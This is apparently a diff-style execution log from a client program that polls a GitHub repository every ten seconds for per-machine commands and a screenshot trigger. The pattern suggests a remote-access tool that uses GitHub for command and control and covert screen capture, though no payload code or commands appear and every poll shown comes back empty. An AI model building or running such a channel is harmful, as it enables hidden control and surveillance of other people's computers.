+[2026-08-04 03:03:01.491] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFW7OU4DQXZSWF263OTKOEIFDAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:01.492] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:01.494] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:01.495] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:03:01.496] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:03:01.499] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:03:01.500] Processing screenshot config...
+[2026-08-04 03:03:01.501] [TRACE] handle_capture_settings: start
+[2026-08-04 03:03:01.504] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:03:02.048] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:03:02.050] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:03:02.051] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:03:02.051] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:03:02.052] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:03:02.054] Sleeping for 10 seconds...
+[2026-08-04 03:03:12.057] [TRACE] main loop: iteration start
+[2026-08-04 03:03:12.058] 
+--- POLL ITERATION START ---
+[2026-08-04 03:03:12.059] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:03:12.618] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:03:13.020] screenshots/config.json already exists
+[2026-08-04 03:03:14.022] Fetching path list from GitHub...
+[2026-08-04 03:03:14.023] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:03:14.024] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:03:14.567] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:14.569] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQR5ANNCQQPETNY4WDKOEIF5AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:14.570] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:14.574] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:14.577] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:03:15.583] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:03:15.962] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:15.963] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTUZ6HHEINHBWP7LJ3KOEIGBAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:15.964] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:15.965] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:15.966] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:03:17.967] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:03:18.346] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:18.347] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUXRMXAQKY4F5XKIJ3KOEIGFAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:18.347] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:18.348] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:18.349] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:03:21.350] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:03:21.720] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:21.721] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXOLDXETIYTXSYPDL3KOEIGNAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:21.721] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:21.722] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:21.723] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:03:21.723] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:03:21.724] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:03:21.725] Processing screenshot config...
+[2026-08-04 03:03:21.726] [TRACE] handle_capture_settings: start
+[2026-08-04 03:03:21.727] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:03:22.289] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:03:22.290] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:03:22.291] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:03:22.292] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:03:22.293] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:03:22.295] Sleeping for 10 seconds...
+[2026-08-04 03:03:32.298] [TRACE] main loop: iteration start
+[2026-08-04 03:03:32.299] 
+--- POLL ITERATION START ---
+[2026-08-04 03:03:32.300] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:03:32.842] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:03:33.221] screenshots/config.json already exists
+[2026-08-04 03:03:34.224] Fetching path list from GitHub...
+[2026-08-04 03:03:34.226] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:03:34.227] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:03:34.769] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:34.770] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUSI2RUTC3DOK4I3Y3KOEIHHAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:34.771] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:34.771] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:34.772] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:03:35.774] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:03:36.147] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:36.147] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUAPMOQVX6IDEF6TCLKOEIHJAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:36.148] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:36.149] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:36.150] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:03:38.151] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:03:38.519] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:38.520] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUE3QRWTLAP7U4OT6TKOEIHNAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:38.521] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:38.522] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:38.523] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:03:41.525] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:03:41.904] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:41.905] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFX74SIJZ6HUA3FGU23KOEIHVAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:41.906] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:41.908] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:41.911] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:03:41.912] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:03:41.915] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:03:41.916] Processing screenshot config...
+[2026-08-04 03:03:41.917] [TRACE] handle_capture_settings: start
+[2026-08-04 03:03:41.920] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:03:42.457] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:03:42.458] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:03:42.459] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:03:42.459] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:03:42.460] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:03:42.461] Sleeping for 10 seconds...
+[2026-08-04 03:03:52.465] [TRACE] main loop: iteration start
+[2026-08-04 03:03:52.466] 
+--- POLL ITERATION START ---
+[2026-08-04 03:03:52.466] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:03:53.006] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:03:53.379] screenshots/config.json already exists
+[2026-08-04 03:03:54.382] Fetching path list from GitHub...
+[2026-08-04 03:03:54.383] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:03:54.384] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:03:54.908] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:54.909] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVYGXXEMVSBCUOLOWLKOEIIPAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:54.910] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:54.911] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:54.911] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:03:55.912] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:03:56.314] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:56.315] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTBEIE2IB25AFXY6STKOEIIRAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:56.316] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:56.317] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:56.318] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:03:58.320] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:03:58.692] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:03:58.693] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUBEQPL2NJ5CPC4N4DKOEIIXAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:03:58.693] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:03:58.694] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:03:58.694] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:04:01.696] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:04:02.057] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:02.058] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFRQ2IBBM6W3RI62H5DKOEII5AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:04:02.059] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:04:02.060] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:04:02.060] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:04:02.061] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:04:02.062] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:04:02.063] Processing screenshot config...
+[2026-08-04 03:04:02.064] [TRACE] handle_capture_settings: start
+[2026-08-04 03:04:02.065] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:04:02.562] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:04:02.563] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:04:02.564] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:04:02.564] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:04:02.565] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:04:02.566] Sleeping for 10 seconds...
+[2026-08-04 03:04:12.570] [TRACE] main loop: iteration start
+[2026-08-04 03:04:12.571] 
+--- POLL ITERATION START ---
+[2026-08-04 03:04:12.571] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:04:13.128] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:04:13.514] screenshots/config.json already exists
+[2026-08-04 03:04:14.517] Fetching path list from GitHub...
+[2026-08-04 03:04:14.518] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:04:14.519] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:04:15.069] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:04:15.070] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQSZKMMM2HCELAEZ2TKOEIJXAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_C